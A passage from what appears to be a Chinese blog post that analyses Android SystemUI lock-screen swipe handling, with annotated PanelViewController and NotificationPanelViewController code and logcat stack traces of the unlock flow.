mMinExpandHeight = <span class="number">0.0f</span>;</span><br><span class="line">                 mDownTime = SystemClock.uptimeMillis();</span><br><span class="line">                 <span class="keyword">if</span> (mAnimatingOnDown &amp;&amp; mClosing &amp;&amp; !mHintAnimationRunning</span><br><span class="line">                         || mPeekAnimator != <span class="literal">null</span>) &#123;</span><br><span class="line">                     cancelHeightAnimator();</span><br><span class="line">                     cancelPeek();</span><br><span class="line">                     mTouchSlopExceeded = <span class="literal">true</span>;</span><br><span class="line">                     <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">                 mInitialTouchY = y;</span><br><span class="line">                 mInitialTouchX = x;</span><br><span class="line">                 mTouchStartedInEmptyArea = !isInContentBounds(x, y);</span><br><span class="line">                 mTouchSlopExceeded = mTouchSlopExceededBeforeDown;</span><br><span class="line">                 mJustPeeked = <span class="literal">false</span>;</span><br><span class="line">                 mMotionAborted = <span class="literal">false</span>;</span><br><span class="line">                 mPanelClosedOnDown = isFullyCollapsed();</span><br><span class="line">                 mCollapsedAndHeadsUpOnDown = <span class="literal">false</span>;</span><br><span class="line">                 mHasLayoutedSinceDown = <span class="literal">false</span>;</span><br><span class="line">                 mUpdateFlingOnLayout = <span class="literal">false</span>;</span><br><span class="line">                 mTouchAboveFalsingThreshold = <span class="literal">false</span>;</span><br><span class="line">                 addMovement(event);</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_POINTER_UP:</span><br><span class="line">                 <span class="keyword">final</span> <span class="type">int</span> <span class="variable">upPointer</span> <span class="operator">=</span> event.getPointerId(event.getActionIndex());</span><br><span class="line">                 <span class="keyword">if</span> (mTrackingPointer == upPointer) &#123;</span><br><span class="line">                     <span class="comment">// gesture is ongoing, find a new pointer to track</span></span><br><span class="line">                     <span class="keyword">final</span> <span class="type">int</span> <span class="variable">newIndex</span> <span class="operator">=</span> event.getPointerId(<span class="number">0</span>) != upPointer ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">                     mTrackingPointer = event.getPointerId(newIndex);</span><br><span class="line">                     mInitialTouchX = event.getX(newIndex);</span><br><span class="line">                     mInitialTouchY = event.getY(newIndex);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_POINTER_DOWN:</span><br><span class="line">                 <span class="keyword">if</span> (mStatusBarStateController.getState() == StatusBarState.KEYGUARD) &#123;</span><br><span class="line">                     mMotionAborted = <span class="literal">true</span>;</span><br><span class="line">                     mVelocityTracker.clear();</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_MOVE:</span><br><span class="line">                 <span class="keyword">final</span> <span class="type">float</span> <span class="variable">h</span> <span class="operator">=</span> y - mInitialTouchY;</span><br><span class="line">                 addMovement(event);</span><br><span class="line">                 <span class="keyword">if</span> (canCollapsePanel || mTouchStartedInEmptyArea || mAnimatingOnDown) &#123;</span><br><span class="line">                     <span class="type">float</span> <span class="variable">hAbs</span> <span class="operator">=</span> Math.abs(h);</span><br><span class="line">                     <span class="type">float</span> <span class="variable">touchSlop</span> <span class="operator">=</span> getTouchSlop(event);</span><br><span class="line">                     <span class="keyword">if</span> ((h &lt; -touchSlop || (mAnimatingOnDown &amp;&amp; hAbs &gt; touchSlop))</span><br><span class="line">                             &amp;&amp; hAbs &gt; Math.abs(x - mInitialTouchX)) &#123;</span><br><span class="line">                         cancelHeightAnimator();</span><br><span class="line">                         startExpandMotion(x, y, <span class="literal">true</span> <span class="comment">/* startTracking */</span>, mExpandedHeight);</span><br><span class="line">                         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_CANCEL:</span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_UP:</span><br><span class="line">                 mVelocityTracker.clear();</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouch</span><span class="params">(View v, MotionEvent event)</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (mInstantExpanding || (mTouchDisabled</span><br><span class="line">                 &amp;&amp; event.getActionMasked() != MotionEvent.ACTION_CANCEL) || (mMotionAborted</span><br><span class="line">                 &amp;&amp; event.getActionMasked() != MotionEvent.ACTION_DOWN)) &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// If dragging should not expand the notifications shade, then return false.</span></span><br><span class="line">         <span class="keyword">if</span> (!mNotificationsDragEnabled) &#123;</span><br><span class="line">             <span class="keyword">if</span> (mTracking) &#123;</span><br><span class="line">                 <span class="comment">// Turn off tracking if it&#x27;s on or the shade can get stuck in the down position.</span></span><br><span class="line">                 onTrackingStopped(<span class="literal">true</span> <span class="comment">/* expand */</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// On expanding, single mouse click expands the panel instead of dragging.</span></span><br><span class="line">         <span class="keyword">if</span> (isFullyCollapsed() &amp;&amp; event.isFromSource(InputDevice.SOURCE_MOUSE)) &#123;</span><br><span class="line">             <span class="keyword">if</span> (event.getAction() == MotionEvent.ACTION_UP) &#123;</span><br><span class="line">                 expand(<span class="literal">true</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         <span class="comment">/*</span></span><br><span class="line"><span class="comment">          * We capture touch events here and update the expand height here in case according to</span></span><br><span class="line"><span class="comment">          * the users fingers. This also handles multi-touch.</span></span><br><span class="line"><span class="comment">          *</span></span><br><span class="line"><span class="comment">          * If the user just clicks shortly, we show a quick peek of the shade.</span></span><br><span class="line"><span class="comment">          *</span></span><br><span class="line"><span class="comment">          * Flinging is also enabled in order to open or close the shade.</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line"> </span><br><span class="line">         <span class="type">int</span> <span class="variable">pointerIndex</span> <span class="operator">=</span> event.findPointerIndex(mTrackingPointer);</span><br><span class="line">         <span class="keyword">if</span> (pointerIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">             pointerIndex = <span class="number">0</span>;</span><br><span class="line">             mTrackingPointer = event.getPointerId(pointerIndex);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">final</span> <span class="type">float</span> <span class="variable">x</span> <span class="operator">=</span> event.getX(pointerIndex);</span><br><span class="line">         <span class="keyword">final</span> <span class="type">float</span> <span class="variable">y</span> <span class="operator">=</span> event.getY(pointerIndex);</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span> (event.getActionMasked() == MotionEvent.ACTION_DOWN) &#123;</span><br><span class="line">             mGestureWaitForTouchSlop = shouldGestureWaitForTouchSlop();</span><br><span class="line">             mIgnoreXTouchSlop = isFullyCollapsed() || shouldGestureIgnoreXTouchSlop(x, y);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">switch</span> (event.getActionMasked()) &#123;</span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_DOWN:</span><br><span class="line">                 startExpandMotion(x, y, <span class="literal">false</span> <span class="comment">/* startTracking */</span>, mExpandedHeight);</span><br><span class="line">                 mJustPeeked = <span class="literal">false</span>;</span><br><span class="line">                 mMinExpandHeight = <span class="number">0.0f</span>;</span><br><span class="line">                 mPanelClosedOnDown = isFullyCollapsed();</span><br><span class="line">                 mHasLayoutedSinceDown = <span class="literal">false</span>;</span><br><span class="line">                 mUpdateFlingOnLayout = <span class="literal">false</span>;</span><br><span class="line">                 mMotionAborted = <span class="literal">false</span>;</span><br><span class="line">                 mPeekTouching = mPanelClosedOnDown;</span><br><span class="line">                 mDownTime = SystemClock.uptimeMillis();</span><br><span class="line">                 mTouchAboveFalsingThreshold = <span class="literal">false</span>;</span><br><span class="line">                 mCollapsedAndHeadsUpOnDown =</span><br><span class="line">                         isFullyCollapsed() &amp;&amp; mHeadsUpManager.hasPinnedHeadsUp();</span><br><span class="line">                 addMovement(event);</span><br><span class="line">                 <span class="keyword">if</span> (!mGestureWaitForTouchSlop || (mHeightAnimator != <span class="literal">null</span></span><br><span class="line">                         &amp;&amp; !mHintAnimationRunning) || mPeekAnimator != <span class="literal">null</span>) &#123;</span><br><span class="line">                     mTouchSlopExceeded =</span><br><span class="line">                             (mHeightAnimator != <span class="literal">null</span> &amp;&amp; !mHintAnimationRunning)</span><br><span class="line">                                     || mPeekAnimator != <span class="literal">null</span> || mTouchSlopExceededBeforeDown;</span><br><span class="line">                     cancelHeightAnimator();</span><br><span class="line">                     cancelPeek();</span><br><span class="line">                     onTrackingStarted();</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">if</span> (isFullyCollapsed() &amp;&amp; !mHeadsUpManager.hasPinnedHeadsUp()</span><br><span class="line">                         &amp;&amp; !mStatusBar.isBouncerShowing()) &#123;</span><br><span class="line">                     startOpening(event);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_POINTER_UP:</span><br><span class="line">                 <span class="keyword">final</span> <span class="type">int</span> <span class="variable">upPointer</span> <span class="operator">=</span> event.getPointerId(event.getActionIndex());</span><br><span class="line">                 <span class="keyword">if</span> (mTrackingPointer == upPointer) &#123;</span><br><span class="line">                     <span class="comment">// gesture is ongoing, find a new pointer to track</span></span><br><span class="line">                     <span class="keyword">final</span> <span class="type">int</span> <span class="variable">newIndex</span> <span class="operator">=</span> event.getPointerId(<span class="number">0</span>) != upPointer ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">                     <span class="keyword">final</span> <span class="type">float</span> <span class="variable">newY</span> <span class="operator">=</span> event.getY(newIndex);</span><br><span class="line">                     <span class="keyword">final</span> <span class="type">float</span> <span class="variable">newX</span> <span class="operator">=</span> event.getX(newIndex);</span><br><span class="line">                     mTrackingPointer = event.getPointerId(newIndex);</span><br><span class="line">                     startExpandMotion(newX, newY, <span class="literal">true</span> <span class="comment">/* startTracking */</span>, mExpandedHeight);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_POINTER_DOWN:</span><br><span class="line">                 <span class="keyword">if</span> (mStatusBarStateController.getState() == StatusBarState.KEYGUARD) &#123;</span><br><span class="line">                     mMotionAborted = <span class="literal">true</span>;</span><br><span class="line">                     endMotionEvent(event, x, y, <span class="literal">true</span> <span class="comment">/* forceCancel */</span>);</span><br><span class="line">                     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_MOVE:</span><br><span class="line">                 addMovement(event);</span><br><span class="line">                 <span class="type">float</span> <span class="variable">h</span> <span class="operator">=</span> y - mInitialTouchY;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// If the panel was collapsed when touching, we only need to check for the</span></span><br><span class="line">                 <span class="comment">// y-component of the gesture, as we have no conflicting horizontal gesture.</span></span><br><span class="line">                 <span class="keyword">if</span> (Math.abs(h) &gt; getTouchSlop(event)</span><br><span class="line">                         &amp;&amp; (Math.abs(h) &gt; Math.abs(x - mInitialTouchX)</span><br><span class="line">                         || mIgnoreXTouchSlop)) &#123;</span><br><span class="line">                     mTouchSlopExceeded = <span class="literal">true</span>;</span><br><span class="line">                     <span class="keyword">if</span> (mGestureWaitForTouchSlop &amp;&amp; !mTracking &amp;&amp; !mCollapsedAndHeadsUpOnDown) &#123;</span><br><span class="line">                         <span class="keyword">if</span> (!mJustPeeked &amp;&amp; mInitialOffsetOnTouch != <span class="number">0f</span>) &#123;</span><br><span class="line">                             startExpandMotion(x, y, <span class="literal">false</span> <span class="comment">/* startTracking */</span>, mExpandedHeight);</span><br><span class="line">                             h = <span class="number">0</span>;</span><br><span class="line">                         &#125;</span><br><span class="line">                         cancelHeightAnimator();</span><br><span class="line">                         <span class="comment">// 向上滑动时，手指移动的距离达到一定的阈值会调用onTrackingStarted，</span></span><br><span class="line">                         <span class="comment">// 设置mTracking值为true，从而接收touch事件</span></span><br><span class="line">                         onTrackingStarted();</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="type">float</span> <span class="variable">newHeight</span> <span class="operator">=</span> Math.max(<span class="number">0</span>, h + mInitialOffsetOnTouch);</span><br><span class="line">                 <span class="keyword">if</span> (newHeight &gt; mPeekHeight) &#123;</span><br><span class="line">                     <span class="keyword">if</span> (mPeekAnimator != <span class="literal">null</span>) &#123;</span><br><span class="line">                         mPeekAnimator.cancel();</span><br><span class="line">                     &#125;</span><br><span class="line">                     mJustPeeked = <span class="literal">false</span>;</span><br><span class="line">                 &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mPeekAnimator == <span class="literal">null</span> &amp;&amp; mJustPeeked) &#123;</span><br><span class="line">                     <span class="comment">// The initial peek has finished, but we haven&#x27;t dragged as far yet, lets</span></span><br><span class="line">                     <span class="comment">// speed it up by starting at the peek height.</span></span><br><span class="line">                     mInitialOffsetOnTouch = mExpandedHeight;</span><br><span class="line">                     mInitialTouchY = y;</span><br><span class="line">                     mMinExpandHeight = mExpandedHeight;</span><br><span class="line">                     mJustPeeked = <span class="literal">false</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">                 newHeight = Math.max(newHeight, mMinExpandHeight);</span><br><span class="line">                 <span class="keyword">if</span> (-h &gt;= getFalsingThreshold()) &#123;</span><br><span class="line">                     mTouchAboveFalsingThreshold = <span class="literal">true</span>;</span><br><span class="line">                     mUpwardsWhenThresholdReached = isDirectionUpwards(x, y);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">if</span> (!mJustPeeked &amp;&amp; (!mGestureWaitForTouchSlop || mTracking)</span><br><span class="line">                         &amp;&amp; !isTrackingBlocked()) &#123;</span><br><span class="line">                     <span class="comment">// 用户滑动过程会调用setExpandedHeightInternal</span></span><br><span class="line">                     setExpandedHeightInternal(newHeight);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_UP:</span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_CANCEL:</span><br><span class="line">                 addMovement(event);</span><br><span class="line">                 endMotionEvent(event, x, y, <span class="literal">false</span> <span class="comment">/* forceCancel */</span>);</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> !mGestureWaitForTouchSlop || mTracking;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>移动过程中：主要在调用了两个方法。<br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/PanelViewController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onTrackingStarted</span><span class="params">()</span> &#123;</span><br><span class="line">        endClosing();</span><br><span class="line">        mTracking = <span class="literal">true</span>;</span><br><span class="line">        mBar.onTrackingStarted();</span><br><span class="line">        notifyExpandingStarted();</span><br><span class="line">        notifyBarPanelExpansionChanged();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/PanelViewController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setExpandedHeightInternal</span><span class="params">(<span class="type">float</span> h)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isNaN(h)) &#123;</span><br><span class="line">            Log.wtf(TAG, <span class="string">&quot;ExpandedHeight set to NaN&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (mExpandLatencyTracking &amp;&amp; h != <span class="number">0f</span>) &#123;</span><br><span class="line">            DejankUtils.postAfterTraversal(</span><br><span class="line">                    () -&gt; mLatencyTracker.onActionEnd(LatencyTracker.ACTION_EXPAND_PANEL));</span><br><span class="line">            mExpandLatencyTracking = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">float</span> <span class="variable">fhWithoutOverExpansion</span> <span class="operator">=</span> getMaxPanelHeight() - getOverExpansionAmount();</span><br><span class="line">        <span class="keyword">if</span> (mHeightAnimator == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">float</span> <span class="variable">overExpansionPixels</span> <span class="operator">=</span> Math.max(<span class="number">0</span>, h - fhWithoutOverExpansion);</span><br><span class="line">            <span class="keyword">if</span> (getOverExpansionPixels() != overExpansionPixels &amp;&amp; mTracking) &#123;</span><br><span class="line">                setOverExpansion(overExpansionPixels, <span class="literal">true</span> <span class="comment">/* isPixels */</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            mExpandedHeight = Math.min(h, fhWithoutOverExpansion) + getOverExpansionAmount();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mExpandedHeight = h;</span><br><span class="line">            <span class="keyword">if</span> (mOverExpandedBeforeFling) &#123;</span><br><span class="line">                setOverExpansion(Math.max(<span class="number">0</span>, h - fhWithoutOverExpansion), <span class="literal">false</span> <span class="comment">/* isPixels */</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// If we are closing the panel and we are almost there due to a slow decelerating</span></span><br><span class="line">        <span class="comment">// interpolator, abort the animation.</span></span><br><span class="line">        <span class="keyword">if</span> (mExpandedHeight &lt; <span class="number">1f</span> &amp;&amp; mExpandedHeight != <span class="number">0f</span> &amp;&amp; mClosing) &#123;</span><br><span class="line">            mExpandedHeight = <span class="number">0f</span>;</span><br><span class="line">            <span class="keyword">if</span> (mHeightAnimator != <span class="literal">null</span>) &#123;</span><br><span class="line">                mHeightAnimator.end();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mExpandedFraction = Math.min(<span class="number">1f</span>,</span><br><span class="line">                fhWithoutOverExpansion == <span class="number">0</span> ? <span class="number">0</span> : mExpandedHeight / fhWithoutOverExpansion);</span><br><span class="line">        <span class="comment">// 进行锁屏上的时间和通知View根据手指的移动距离进行缩小、变透明处理 </span></span><br><span class="line">        onHeightUpdated(mExpandedHeight);</span><br><span class="line">        notifyBarPanelExpansionChanged();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下面主要从：onHeightUpdated、notifyBarPanelExpansionChanged 两方法作为入口。<br>先看 <strong>NotificationPanelViewController#onHeightUpdated()</strong><br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/NotificationPanelViewController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onHeightUpdated</span><span class="params">(<span class="type">float</span> expandedHeight)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!mQsExpanded || mQsExpandImmediate || mIsExpanding &amp;&amp; mQsExpandedWhenExpandingStarted) &#123;</span><br><span class="line">        <span class="comment">// 更新时钟位置将设置顶部填充，这可能会触发新的面板高度并重新定位时钟。</span></span><br><span class="line">        <span class="comment">// 这是一个循环依赖项，应该避免，否则会出现堆栈溢出。</span></span><br><span class="line">        <span class="keyword">if</span> (mStackScrollerMeasuringPass &gt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;Unstable notification panel height. Aborting.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//锁屏上的时间和通知View根据手指的移动距离进行缩小、变透明处理</span></span><br><span class="line">            positionClockAndNotifications();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mQsExpandImmediate || mQsExpanded &amp;&amp; !mQsTracking &amp;&amp; mQsExpansionAnimator == <span class="literal">null</span></span><br><span class="line">            &amp;&amp; !mQsExpansionFromOverscroll) &#123;</span><br><span class="line">        <span class="type">float</span> t;</span><br><span class="line">        <span class="keyword">if</span> (mKeyguardShowing) &#123;</span><br><span class="line">            <span class="comment">// 在Keyguard上，将QS扩展线性插值到面板扩展</span></span><br><span class="line">            t = expandedHeight / (getMaxPanelHeight());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// In Shade, interpolate linearly such that QS is closed whenever panel height is</span></span><br><span class="line">            <span class="comment">// minimum QS expansion + minStackHeight</span></span><br><span class="line">            <span class="type">float</span></span><br><span class="line">                    <span class="variable">panelHeightQsCollapsed</span> <span class="operator">=</span></span><br><span class="line">                    mNotificationStackScroller.getIntrinsicPadding()</span><br><span class="line">                            + mNotificationStackScroller.getLayoutMinHeight();</span><br><span class="line">            <span class="type">float</span> <span class="variable">panelHeightQsExpanded</span> <span class="operator">=</span> calculatePanelHeightQsExpanded();</span><br><span class="line">            t =</span><br><span class="line">                    (expandedHeight - panelHeightQsCollapsed) / (panelHeightQsExpanded</span><br><span class="line">                            - panelHeightQsCollapsed);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">float</span></span><br><span class="line">                <span class="variable">targetHeight</span> <span class="operator">=</span></span><br><span class="line">                mQsMinExpansionHeight + t * (mQsMaxExpansionHeight - mQsMinExpansionHeight);</span><br><span class="line">        setQsExpansion(targetHeight);</span><br><span class="line">    &#125;</span><br><span class="line">    updateExpandedHeight(expandedHeight);</span><br><span class="line">    updateHeader();</span><br><span class="line">    <span class="comment">// 更新通知半透明</span></span><br><span class="line">    updateNotificationTranslucency();</span><br><span class="line">    updatePanelExpanded();</span><br><span class="line">    updateGestureExclusionRect();</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        mView.invalidate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里了就一起看个滑动解锁的堆栈：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  : java.lang.Throwable:</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at com.android.keyguard.KeyguardSecurityContainer.showNextSecurityScreenOrFinish(KeyguardSecurityContainer.java:710)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at com.android.keyguard.KeyguardHostView.dismiss(KeyguardHostView.java:214)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at com.android.keyguard.KeyguardHostView.dismiss(KeyguardHostView.java:196)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at com.android.systemui.statusbar.phone.KeyguardBouncer.show(KeyguardBouncer.java:167)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at com.android.systemui.statusbar.phone.StatusBarKeyguardViewManager.showBouncer(StatusBarKeyguardViewManager.java:434)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at com.android.systemui.statusbar.phone.StatusBar.showBouncerIfKeyguard(StatusBar.java:3959)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at com.android.systemui.statusbar.phone.StatusBar.makeExpandedInvisible(StatusBar.java:2506)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at com.android.systemui.statusbar.phone.PhoneStatusBarView$1.run(PhoneStatusBarView.java:65)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at android.os.Handler.handleCallback(Handler.java:938)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at android.os.Looper.loop(Looper.java:223)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at android.app.ActivityThread.main(ActivityThread.java:7945)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:603)</span><br><span class="line">12-30 08:32:48.658  1479  1479 D longzhiye  :      at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:947)</span><br></pre></td></tr></table></figure><p>再看一个滑动后到密码安全锁（即密码解锁）的堆栈</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: : java.lang.Throwable</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at com.android.keyguard.KeyguardSecurityContainer.showNextSecurityScreenOrFinish(KeyguardSecurityContainer.java:710)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at com.android.keyguard.KeyguardHostView.dismiss(KeyguardHostView.java:214)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at com.android.keyguard.KeyguardHostView.dismiss(KeyguardHostView.java:196)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at com.android.systemui.statusbar.phone.KeyguardBouncer.show(KeyguardBouncer.java:167)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at com.android.systemui.statusbar.phone.StatusBarKeyguardViewManager.onPanelExpansionChanged(StatusBarKeyguardViewManager.java:297)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at com.android.systemui.statusbar.phone.PanelViewController.notifyBarPanelExpansionChanged(PanelViewController.java:1011)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at com.android.systemui.statusbar.phone.PanelViewController.setExpandedHeightInternal(PanelViewController.java:727)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at com.android.systemui.statusbar.phone.PanelViewController$TouchHandler.onTouch(PanelViewController.java:1338)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at 